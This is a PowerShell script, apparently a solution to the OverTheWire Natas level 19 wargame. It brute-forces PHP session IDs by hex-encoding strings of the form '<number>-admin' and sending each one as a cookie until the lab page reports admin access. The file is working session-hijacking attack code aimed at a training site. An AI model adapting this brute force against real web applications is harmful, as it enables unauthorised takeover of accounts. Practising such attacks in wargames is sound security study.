#url to brute force
$natas = 'http://natas19.natas.labs.overthewire.org'

#create a credential object. Not using BetterCredentials, so can't store it in Credential Manager.
$username = 'natas19'
$password = ''
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $username,$(ConvertTo-SecureString -AsPlainText -Force -String $password)

<#first attempt at finding the session involved something like:
$nums = (30..39)
foreach ($a in $nums) { foreach ($b in $nums) { foreach ($c in $nums) { write-output "$a$b$($c)2d61646d696e" } } }
#>

#after reading http://floatingbytes.blogspot.ca/2014/10/wargames-natas-19.html and seeing how he did it, took a similar approach:
foreach ($a in (0..999)) { 
if ($a % 10 -eq 0) { Write-Output "Checked $a sessions so far..." } 
$c = ""
foreach ($b in "$a-admin".ToCharArray()) {
$c += [convert]::tostring([byte][char]$b,16)
}

#this is to create the session with the cookie.
#totally stoled it from https://gripdev.wordpress.com/2015/05/27/powershell-invoke-webrequest-with-a-cookie/
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$cookie = New-Object System.Net.Cookie
$cookie.Name = 'PHPSESSID'
$cookie.Value = $c
$cookie.Domain = 'natas19.natas.labs.overthewire.org'
$session.Cookies.Add($cookie)

#passing the $credential object because it didn't like trying to pass it through the URL
$current = Invoke-WebRequest $natas -WebSession $session -Credential $credential

if ($current.Content -like '*You are an admin.*') { Write-Output "$a Looks like a match"
Write-Output $current.Content
break
 }

}

